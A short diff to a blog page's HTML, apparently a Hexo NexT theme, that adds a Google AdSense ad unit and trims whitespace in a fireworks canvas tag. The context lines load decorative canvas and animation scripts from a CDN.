+<ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-3938956891324222" data-ad-slot="6163650450" data-ad-format="auto" data-full-width-responsive="true"></ins>
 <script>
      (adsbygoogle = window.adsbygoogle || []).push({});
 </script>
@@ -758,7 +759,7 @@ NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
   <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
   
   
-   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
    <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
    <script type="text/javascript" src="/js/fireworks.js"></script>
 
